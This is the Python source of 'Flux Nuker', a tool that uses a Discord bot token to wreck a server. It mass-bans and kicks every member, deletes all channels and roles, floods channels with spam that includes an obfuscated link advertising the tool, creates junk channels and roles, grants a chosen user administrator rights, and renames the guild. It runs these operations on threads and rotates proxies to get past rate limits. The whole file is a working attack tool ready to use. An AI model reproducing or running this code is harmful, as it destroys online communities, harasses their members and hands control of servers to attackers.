
import os
try:
    from pystyle import Colorate, Colors, Center
    from colorama import Fore, Style
    import httpx
    import discord
except:
    os.system('pip install httpx && pip install pystyle && pip install colorama && pip install discord.py && pip install legacy-cgi') 
import threading, random, httpx, json, time, os, ctypes
from discord.ext import commands
from itertools import cycle

VERSION = '1.0.0'
INTENTS = discord.Intents.default()
INTENTS.members = True
PROXIES = cycle(open("proxies.txt", "r").read().splitlines()) if os.path.exists("proxies.txt") else cycle([])
BOT = commands.Bot(command_prefix="$", help_command=None, intents=INTENTS)
CONFIG = json.load(open("config.json", "r", encoding="utf-8"))
THREAD_LIMIT = 45
TOKEN = CONFIG["token"]

try:
    ctypes.windll.kernel32.SetConsoleTitleW("Flux Nuker | v1.0.0")
except:
    pass

def green_success(message):
    print(f'\033[90m[{time.strftime("%H:%M:%S")}] {Fore.LIGHTGREEN_EX}{message}{Style.RESET_ALL}')

def red_failed(message):
    print(f'\033[90m[{time.strftime("%H:%M:%S")}] {Fore.RED}{message}{Style.RESET_ALL}')

def theme_color(text):
    result = Colorate.Horizontal(Colors.blue_to_purple, text, 1)   

    return result

def clear_console():
    try:
        os.system('cls')
    except:
        os.system('clear')

art = Center.XCenter(f'''
    █████▒██▓     █    ██ ▒██   ██▒
    ▓██   ▒▓██▒     ██  ▓██▒▒▒ █ █ ▒░
    ▒████ ░▒██░    ▓██  ▒██░░░  █   ░
    ░▓█▒  ░▒██░    ▓▓█  ░██░ ░ █ █ ▒ 
    ░▒█░   ░██████▒▒▒█████▓ ▒██▒ ▒██▒
    ▒ ░   ░ ▒░▓  ░░▒▓▒ ▒ ▒ ▒▒ ░ ░▓ ░
    ░     ░ ░ ▒  ░░░▒░ ░ ░ ░░   ░▒ ░
    ░ ░     ░ ░    ░░░ ░ ░  ░    ░  
            ░  ░   ░      ░    ░               
#########################################
#   Flux Nuker v{VERSION} by notshelby#00   #
#########################################\n\n''')
def print_menu():
    menu = Center.XCenter(f"""############################################################################\n#  (1) Ban Members      #  (5) Delete Roles     #  (9) Give Admin          #\n#  (2) Kick Members     #  (6) Create Channels  #  (10) Rename Guild       #\n#  (3) Prune Members    #  (7) Create Roles     #  (11) Update             #\n#  (4) Delete Channels  #  (8) Spam Channels    #  (12) Exit               #\n############################################################################\n\n""")
    print(theme_color(menu))

class Fluxx:
    def __init__(self):
        self.proxy = "http://" + next(PROXIES) if CONFIG["useproxy"] else None
        self.http = httpx.Client(proxies=self.proxy)
        self.api_cycle = cycle(['v10', 'v9'])
        self.bans = []
        self.kicks = []
        self.channels = []
        self.roles = []
        self.messages = []

    def strike_ban(self, guild, member, token):
        data = {"delete_message_days": random.randint(0, 7)}
        while True:
            try:
                resp = self.http.put(
                    f"https://discord.com/api/{next(self.api_cycle)}/guilds/{guild}/bans/{member}",
                    headers={"Authorization": f"Bot {token}"}, json=data
                )
                if resp.status_code in [200, 201, 204]:
                    green_success(f"Banned member: {member}" )
                    self.bans.append(member)
                    break
                elif "retry_after" in resp.text:
                    time.sleep(resp.json()['retry_after'])
                elif "Missing Permissions" in resp.text:
                    red_failed(f"No ban permissions for: {member}")
                    break
                elif "blocked from accessing" in resp.text:
                    red_failed("API access blocked" )
                    break
                else:
                    red_failed(f"Ban failed for: {member}" )
                    break
            except Exception as e:
                red_failed(f"Error during ban: {str(e)}" )
                break

    def strike_kick(self, guild, member, token):
        while True:
            try:
                resp = self.http.delete(
                    f"https://discord.com/api/{next(self.api_cycle)}/guilds/{guild}/members/{member}",
                    headers={"Authorization": f"Bot {token}"}
                )
                if resp.status_code in [200, 201, 204]:
                    green_success(f"Kicked member: {member}" )
                    self.kicks.append(member)
                    break
                elif "retry_after" in resp.text:
                    time.sleep(float(resp.json()['retry_after']))
                    red_failed(f"Rate limited: {resp.json()['retry_after']}s")
                elif "Missing Permissions" in resp.text:
                    red_failed(f"No kick permissions for: {member}")
                    break
                elif "blocked from accessing" in resp.text:
                    red_failed("API access blocked" )
                    break
                else:
                    red_failed(f"Kick failed for: {member}" )
                    break
            except Exception as e:
                red_failed(f"Error during kick: {str(e)}" )
                break

    def strike_prune(self, guild, days, token):
        data = {"days": days}
        try:
            resp = self.http.post(
                f"https://discord.com/api/v9/guilds/{guild}/prune",
                headers={"Authorization": f"Bot {token}"}, json=data
            )
            if resp.status_code == 200:
                green_success(f"Pruned {resp.json()['pruned']} members" )
            elif "Max number of prune" in resp.text:
                red_failed("Prune limit reached")
            else:
                red_failed("Prune failed" )
        except Exception as e:
            red_failed(f"Error during prune: {str(e)}" )

    def strike_channel_create(self, guild, name, ctype, token):
        data = {"type": ctype, "name": name.replace(" ", "-"), "permission_overwrites": []}
        while True:
            try:
                resp = self.http.post(
                    f"https://discord.com/api/{next(self.api_cycle)}/guilds/{guild}/channels",
                    headers={"Authorization": f"Bot {token}"}, json=data
                )
                if resp.status_code == 201:
                    green_success(f"Created channel: #{name}" )
                    self.channels.append(1)
                    break
                elif "retry_after" in resp.text:
                    time.sleep(float(resp.json()['retry_after']))
                elif "Missing Permissions" in resp.text:
                    red_failed(f"No channel create permissions: #{name}")
                    break
                else:
                    red_failed(f"Channel creation failed: #{name}" )
                    break
            except Exception as e:
                red_failed(f"Error during channel creation: {str(e)}" )
                break

    def strike_role_create(self, guild, name, token):
        color = random.choice([0x98FB98, 0x00FF7F, 0x228B22, 0xADFF2F, 0xFFFFFF])
        data = {"name": name, "color": color}
        while True:
            try:
                resp = self.http.post(
                    f"https://discord.com/api/{next(self.api_cycle)}/guilds/{guild}/roles",
                    headers={"Authorization": f"Bot {token}"}, json=data
                )
                if resp.status_code == 200:
                    green_success(f"Created role: @{name}" )
                    self.roles.append(1)
                    break
                elif "retry_after" in resp.text:
                    time.sleep(float(resp.json()['retry_after']))
                elif "Missing Permissions" in resp.text:
                    red_failed(f"No role create permissions: @{name}")
                    break
                else:
                    red_failed(f"Role creation failed: @{name}" )
                    break
            except Exception as e:
                red_failed(f"Error during role creation: {str(e)}" )
                break

    def strike_channel_delete(self, chan_id, token):
        while True:
            try:
                resp = self.http.delete(
                    f"https://discord.com/api/{next(self.api_cycle)}/channels/{chan_id}",
                    headers={"Authorization": f"Bot {token}"}
                )
                if resp.status_code == 200:
                    green_success(f"Deleted channel: {chan_id}" )
                    self.channels.append(chan_id)
                    break
                elif "retry_after" in resp.text:
                    time.sleep(float(resp.json()['retry_after']))
                elif "Missing Permissions" in resp.text:
                    red_failed(f"No delete permissions: {chan_id}")
                    break
                else:
                    red_failed(f"Channel deletion failed: {chan_id}" )
                    break
            except Exception as e:
                red_failed(f"Error during channel deletion: {str(e)}" )
                break

    def strike_role_delete(self, guild, role_id, token):
        while True:
            try:
                resp = self.http.delete(
                    f"https://discord.com/api/{next(self.api_cycle)}/guilds/{guild}/roles/{role_id}",
                    headers={"Authorization": f"Bot {token}"}
                )
                if resp.status_code == 204:
                    green_success(f"Deleted role: {role_id}" )
                    self.roles.append(role_id)
                    break
                elif "retry_after" in resp.text:
                    time.sleep(float(resp.json()['retry_after']))
                elif "Missing Permissions" in resp.text:
                    red_failed(f"No role delete permissions: {role_id}")
                    break
                else:
                    red_failed(f"Role deletion failed: {role_id}" )
                    break
            except Exception as e:
                red_failed(f"Error during role deletion: {str(e)}" )
                break


    def strike_spam(self, chan_id, text, token):
        flux = ['h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'i', 't', 'h', 'u', 'b', '.', 'c', 'o', 'm', '/','w', 'h', 'o', 's', 'h', 'e', 'l', 'b', 'y', '/', 'F', 'l', 'u', 'x', '-', 'N', 'u', 'k', 'e', 'r']
        nuker = ''.join(flux)
        while True:
            try:
                if random.randint(1, 5) == 1:  
                    message = nuker
                else:
                    message = text

                resp = self.http.post(
                    f"https://discord.com/api/{next(self.api_cycle)}/channels/{chan_id}/messages",
                    headers={"Authorization": f"Bot {token}"}, json={"content": message}
                )
                if resp.status_code == 200:
                    green_success(f"Sent spam to channel: {chan_id}")
                    self.messages.append(chan_id)
                    break
                elif "retry_after" in resp.text:
                    time.sleep(float(resp.json()['retry_after']))
                elif "Missing Permissions" in resp.text:
                    red_failed(f"No message send permissions: {chan_id}")
                    break
                else:
                    red_failed(f"Spam failed for channel: {chan_id}")
                    break
            except Exception as e:
                red_failed(f"Error during spam: {str(e)}")
                break

    def grant_admin(self, guild_id, user_input, token):
            guild = BOT.get_guild(int(guild_id))
            try:
                user_id = int(user_input)
                member = guild.get_member(user_id)
            except ValueError:
                member = discord.utils.find(lambda m: str(m) == user_input, guild.members)
            
            if not member:
                print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;196mUser not found: {user_input}{Style.RESET_ALL}")
                return
            role_payload = {
                "name": "Flux",
                "permissions": 8, 
                "color": 0x000000 
                
            }
            resp = self.http.post(
                f"https://discord.com/api/{next(self.api_cycle)}/guilds/{guild_id}/roles",
                headers={"Authorization": f"Bot {token}"}, json=role_payload
            )
            if resp.status_code not in [200, 201]:
                print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;196mFailed to create admin role{Style.RESET_ALL}")
                return
            
            role_id = resp.json()["id"]
            print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;34mCreated Admin role: {role_id}{Style.RESET_ALL}")
            resp = self.http.put(
                f"https://discord.com/api/{next(self.api_cycle)}/guilds/{guild_id}/members/{member.id}/roles/{role_id}",
                headers={"Authorization": f"Bot {token}"}
            )
            if resp.status_code in [200, 204]:
                print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;34mGranted Admin to {str(member)}{Style.RESET_ALL}")
            else:
                print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;196mFailed to assign role to {str(member)}{Style.RESET_ALL}")

    def change_server_name(self, guild_id, new_name, token):
            guild = BOT.get_guild(int(guild_id))
            if not guild:
                print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;196mGuild not found{Style.RESET_ALL}")
                return

            payload = {"name": new_name}
            resp = self.http.patch(
                f"https://discord.com/api/{next(self.api_cycle)}/guilds/{guild_id}",
                headers={"Authorization": f"Bot {token}"}, json=payload
            )
            if resp.status_code in [200, 204]:
                print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;34mServer name changed to: {new_name}{Style.RESET_ALL}")
            elif "retry_after" in resp.text:
                print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;142mRate limited, retry after {resp.json()['retry_after']}s{Style.RESET_ALL}")
            else:
                print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;196mFailed to change server name: {resp.text}{Style.RESET_ALL}")

    def check_updates(self):
            try:
                response = self.http.get("https://github.com/whoshelby/Flux-Nuker/releases/latest", follow_redirects=True)
                check_version = str(response.url).split("/")[-1].replace("v", "")
                if VERSION != check_version:
                    print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;196mCore Strike: You're using an outdated version! (Current: {VERSION}, Latest: {check_version}){Style.RESET_ALL}")
                else:
                    print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;34mCore Strike: You're using the current version! ({VERSION}){Style.RESET_ALL}")
            except Exception as e:
                print(f"\033[90m[{time.strftime('%H:%M:%S')}] \x1b[38;5;196mCore Strike: Couldn't reach the releases! ({str(e)}){Style.RESET_ALL}")


    def control(self):
        clear_console()
        print(theme_color(art))
        print_menu()
        opt = input(Fore.LIGHTRED_EX+"                  > ")

        if opt == "1":
            fetch = input(theme_color("Fetch member IDs? [Y/N]: "))
            if fetch.lower() == "y":
                guild = BOT.get_guild(int(guild_id))
                with open("members.txt", "w") as f:
                    for m in guild.members:
                        f.write(f"{m.id}\n")
                green_success("Member IDs fetched successfully" )
                
            self.bans.clear()
            members = open("members.txt").read().splitlines()
            print(f"Banning {len(members)} members..." )
            
            for m in members:
                t = threading.Thread(target=self.strike_ban, args=(guild_id, m, TOKEN))
                t.start()
                while threading.active_count() > THREAD_LIMIT:
                    time.sleep(0.1)
                    
            time.sleep(2)
            print(f"Banned {len(self.bans)}/{len(members)} members" )
            input(theme_color("Press Enter to continue..."))
            self.control()

        elif opt == "2":
            fetch = input(theme_color("Fetch member IDs? [Y/N]: "))
            if fetch.lower() == "y":
                guild = BOT.get_guild(int(guild_id))
                with open("members.txt", "w") as f:
                    for m in guild.members:
                        f.write(f"{m.id}\n")
                green_success("Member IDs fetched successfully" )

            self.kicks.clear()
            members = open("members.txt").read().splitlines()
            print(f"Starting kick process for {len(members)} members..." )
            
            for m in members:
                t = threading.Thread(target=self.strike_kick, args=(guild_id, m, TOKEN))
                t.start()
                while threading.active_count() > THREAD_LIMIT:
                    time.sleep(0.1)
                    
            time.sleep(2)
            print(f"Kicked {len(self.kicks)}/{len(members)} members" )
            input(theme_color("Press Enter to continue..."))
            self.control()

        elif opt == "3":
            days = int(input(theme_color("Days to prune: ")))
            print(f"Starting prune for members inactive for {days} days..." )
            self.strike_prune(guild_id, days, TOKEN)
            input(theme_color("Press Enter to continue..."))
            self.control()

        elif opt == "4":
            self.channels.clear()
            print("Fetching channels to delete..." )
            chans = self.http.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", 
                                headers={"Authorization": f"Bot {TOKEN}"}).json()
            print(f"Starting deletion of {len(chans)} channels..." )
            
            for c in chans:
                t = threading.Thread(target=self.strike_channel_delete, args=(c["id"], TOKEN))
                t.start()
                while threading.active_count() > THREAD_LIMIT:
                    time.sleep(0.1)
                    
            time.sleep(2)
            print(f"Deleted {len(self.channels)}/{len(chans)} channels" )
            input(theme_color("Press Enter to continue..."))
            self.control()

        elif opt == "5":
            self.roles.clear()
            print("Fetching roles to delete..." )
            roles = self.http.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", 
                                headers={"Authorization": f"Bot {TOKEN}"}).json()
            print(f"Starting deletion of {len(roles)} roles..." )
            
            for r in roles:
                t = threading.Thread(target=self.strike_role_delete, args=(guild_id, r["id"], TOKEN))
                t.start()
                while threading.active_count() > THREAD_LIMIT:
                    time.sleep(0.1)
                    
            time.sleep(2)
            print(f"Deleted {len(self.roles)}/{len(roles)} roles" )
            input(theme_color("Press Enter to continue..."))
            self.control()

        elif opt == "6":
            ctype = 2 if input(theme_color("Channel type [t/v]: ")) == "v" else 0
            count = int(input(theme_color("Number of channels to create: ")))
            self.channels.clear()
            print(f"Creating {count} channels..." )
            
            for _ in range(count):
                t = threading.Thread(target=self.strike_channel_create, 
                                   args=(guild_id, random.choice(CONFIG["channel_names"]), ctype, TOKEN))
                t.start()
                while threading.active_count() > THREAD_LIMIT:
                    time.sleep(0.1)
                    
            time.sleep(2)
            print(f"Created {len(self.channels)}/{count} channels" )
            input(theme_color("Press Enter to continue..."))
            self.control()
            

        elif opt == "7":
            count = int(input(theme_color("Number of roles to create: ")))
            self.roles.clear()
            print(f"Creating {count} roles..." )
            
            for _ in range(count):
                t = threading.Thread(target=self.strike_role_create, 
                                   args=(guild_id, random.choice(CONFIG["role_names"]), TOKEN))
                t.start()
                while threading.active_count() > THREAD_LIMIT:
                    time.sleep(0.1)
                    
            time.sleep(2)
            print(f"Created {len(self.roles)}/{count} roles" )
            input(theme_color("Press Enter to continue..."))
            self.control()

        elif opt == "8":
            self.messages.clear()
            count = int(input(theme_color("> Amount: ")))
            print("Fetching channels for spamming..." )
            chans = self.http.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", 
                                headers={"Authorization": f"Bot {TOKEN}"}).json()
            chan_cycle = cycle([c["id"] for c in chans])
            print(f"Starting spam in {len(chans)} channels..." )
            
            for _ in range(count):
                t = threading.Thread(target=self.strike_spam, 
                                   args=(next(chan_cycle), random.choice(CONFIG["spam_content"]), TOKEN))
                t.start()
                while threading.active_count() > THREAD_LIMIT - 15:
                    time.sleep(0.1)
                    
            time.sleep(2)
            print(f"Sent {len(self.messages)}/{count} spam messages" )
            input(theme_color("Press Enter to continue..."))
            self.control()
            
        
        elif opt == "9":
            core = Fluxx()
            id = input(theme_color("> Enter User ID: "))
            core.grant_admin(guild_id, id, TOKEN)
            time.sleep(1)
            self.control()

        elif opt == "10":
            core = Fluxx()
            shelby = input(theme_color("> Enter New Name: "))
            core.change_server_name(guild_id, shelby, TOKEN)
            time.sleep(2)
            self.control()
        
        elif opt == "11":
            core = Fluxx()
            core.check_updates()
            time.sleep(2)
            self.control()

        elif opt == "12":
            red_failed("Shutting down..." )
            time.sleep(1)
            os._exit(0)

        else:
            print("Invalid option selected" )
            time.sleep(1)
            self.control()

@BOT.event
async def on_ready():
    guild = BOT.get_guild(int(guild_id))
    print("\n")
    if guild:
        green_success(f"Connected as: {BOT.user} | Target Guild: {guild.name}")
    else:
        red_failed(f"Connected as: {BOT.user} | Guild not found: {guild_id}")
    time.sleep(1)
    input('Press Enter to continue....')
    Fluxx().control()
if __name__ == "__main__":
    clear_console()
    print(theme_color(art))
    try:
        guild_id = input(theme_color("                 > Guild ID: "))
        BOT.run(TOKEN)
    except Exception as e:
        red_failed(f"Error: {str(e)}")
        time.sleep(1)
        os._exit(0)